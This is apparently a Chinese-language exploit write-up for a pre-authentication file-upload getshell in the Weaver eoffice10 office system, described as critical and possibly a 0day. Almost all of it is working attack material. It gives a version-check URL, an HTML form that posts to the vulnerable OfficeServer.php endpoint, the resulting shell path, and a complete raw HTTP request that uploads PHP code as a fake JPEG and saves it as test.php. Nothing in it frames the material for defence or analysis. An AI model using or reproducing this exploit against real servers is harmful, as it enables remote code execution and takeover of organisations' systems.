## 泛微 eoffice10 前台 getshell（eoffice10/version.json）: 
```
漏洞等级：严重，可能为 0day 漏洞；
漏洞详情：版本号：http://XXXXXXX:8010/eoffice10/version.json
```

```html
<form method='post'
action='http://XXXXXXXX:8010/eoffice10/server/public/iWebOffice2015/OfficeServer.php'
enctype="multipart/form-data" >
<input type="file" name="FileData"/></br></br>
<input type="text" name="FormData" value="1"/></br></br>
<button type=submit value="上传">上传</button> </form>
```

> shell http://XXXXXXXX:8010/eoffice10/server/public/iWebOffice2015/Document/test.php
```text
POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
Host: XXXXXXXX:8010
Content-Length: 378
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/91.0.4472.77 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/
*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: close
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FileData"; filename="1.jpg"
Content-Type: image/jpeg
<?php echo md5(1);?>
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FormData"
{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test.php'}
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--
```

